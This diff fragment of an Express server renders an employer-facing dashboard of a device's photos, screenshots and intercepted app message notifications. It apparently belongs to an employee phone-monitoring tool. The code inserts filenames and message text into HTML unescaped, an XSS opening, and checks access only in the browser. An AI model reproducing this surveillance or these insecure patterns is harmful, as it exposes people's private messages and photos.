+        <table>
+            <tr><th>Preview</th><th>Filename</th><th>Type</th><th>Size</th><th>Date</th></tr>
+            ${media.map(m => `<tr>
+                <td>${m.thumbnail ? `<img class="thumb" src="data:image/jpeg;base64,${m.thumbnail}"/>` : 'No preview'}</td>
+                <td>${m.filename}</td>
+                <td>${m.is_screenshot ? '📸 Screenshot' : '🖼️ Photo'}</td>
+                <td>${Math.round(m.size_bytes / 1024)}KB</td>
+                <td>${new Date(m.date_taken).toLocaleString()}</td>
+            </tr>`).join('') || '<tr><td colspan="5" style="text-align:center;color:#888;padding:20px">No data</td></tr>'}
+        </table>
+        </div>
+
+        <h2>🔔 Instant Messages</h2>
+        <div class="card" style="padding:0">
+        <table>
+            <tr><th>App</th><th>Sender</th><th>Message</th><th>Date</th></tr>
+            ${notifications.map(n => `<tr><td>${n.app}</td><td>${n.sender}</td><td>${n.message}</td><td>${new Date(n.received_at).toLocaleString()}</td></tr>`).join('') || '<tr><td colspan="4" style="text-align:center;color:#888;padding:20px">No data</td></tr>'}
+        </table>
+        </div>
+
+    </div>
+    <script>
+        if (!localStorage.getItem('employer_id')) window.location.href = '/';
+        function logout() { localStorage.clear(); window.location.href = '/'; }
+    </script>
+    </body></html>`);
+});
+
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
